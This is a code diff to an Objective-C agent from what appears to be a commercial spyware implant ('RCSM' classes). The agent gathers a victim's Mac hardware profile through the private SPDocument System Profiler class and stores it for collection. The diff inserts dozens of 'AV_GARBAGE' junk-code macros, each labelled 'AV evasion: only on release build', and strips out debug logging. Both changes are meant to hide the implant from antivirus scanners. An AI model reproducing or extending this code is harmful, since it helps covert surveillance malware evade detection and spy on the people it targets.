@@ -11,6 +11,7 @@
 #import "RCSMCommon.h"
 #import "RCSMTaskManager.h"
 
+#import "RCSMAVGarbage.h"
 
 NSString *kSPHardwareDataType     = @"SPHardwareDataType";
 NSString *kSPApplicationsDataType = @"SPApplicationsDataType";
@@ -92,12 +93,24 @@ static __m_MAgentDevice *sharedAgentDevice = nil;
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   NSData *infoStr = [self getSystemInfoWithType: kSPHardwareDataType];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   if (infoStr != nil)
     [self writeDeviceInfo: infoStr];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   [infoStr release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   [pool release];
   
@@ -108,69 +121,114 @@ static __m_MAgentDevice *sharedAgentDevice = nil;
 {
   NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   NSData *retData = nil;
   NSString *systemInfoStr = nil;
   NSDictionary *hwDict;
   
-#ifdef DEBUG_DEVICE
-  NSLog(@"%s: running device info with type: %@", __FUNCTION__, aType);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   id SPDocumentClass = nil;
   
   SPDocumentClass = objc_getClass("SPDocument");
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   if (SPDocumentClass == nil) 
-  {
+  {   
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
     [pool release];
     return nil;
   }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   id sp = [[SPDocumentClass alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   if (sp == nil) 
-  {
+  {   
+    // AV evasion: only on release build
+    AV_GARBAGE_001
+    
     [pool release];
     return nil;
   }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   // Setting detail level
   if ([sp respondsToSelector: @selector(setDetailLevel:)])
     [sp performSelector: @selector(setDetailLevel:)
              withObject: (id)1];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   if ([sp respondsToSelector: @selector(reportForDataType:)])
     hwDict = (NSDictionary*)[sp performSelector: @selector(reportForDataType:)
                                      withObject: aType];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   if (hwDict != nil)
   {
     NSArray *items = [hwDict objectForKey: @"_items"];
     
+    // AV evasion: only on release build
+    AV_GARBAGE_006
+    
     if (items != nil)
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+      
       if ([sp respondsToSelector: @selector(stringForItem:dataType:)])
-      {
+      {   
+        // AV evasion: only on release build
+        AV_GARBAGE_009
+  
         systemInfoStr = (NSString*)[sp performSelector: @selector(stringForItem:dataType:)
                                             withObject: hwDict
                                             withObject: aType];
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_007
+        
         if (systemInfoStr != nil) 
-        {
+        {   
+          // AV evasion: only on release build
+          AV_GARBAGE_001
+          
           retData = [[systemInfoStr dataUsingEncoding: NSUTF16LittleEndianStringEncoding] retain];
-#ifdef DEBUG_DEVICE
-          NSLog(@"%s: HW INFO %@ retData %x retcount %d", 
-                __FUNCTION__, systemInfoStr, retData, [retData retainCount]);
-#endif
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_002
+          
         }
       }
     }
     
-#ifdef  DEBUG_DEVICE
-    NSLog(@"%s: HW INFO retData %@", __FUNCTION__, retData);
-#endif
+    // AV evasion: only on release build
+    AV_GARBAGE_006
+    
   }
   
   [pool release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   return retData;
 }
@@ -285,9 +343,15 @@ static __m_MAgentDevice *sharedAgentDevice = nil;
 }
 
 - (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
-{
+{   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   if (aConfiguration != mAgentConfiguration)
-  {
+  {   
+    // AV evasion: only on release build
+    AV_GARBAGE_000
+    
     [mAgentConfiguration release];
     mAgentConfiguration = [aConfiguration retain];
   }
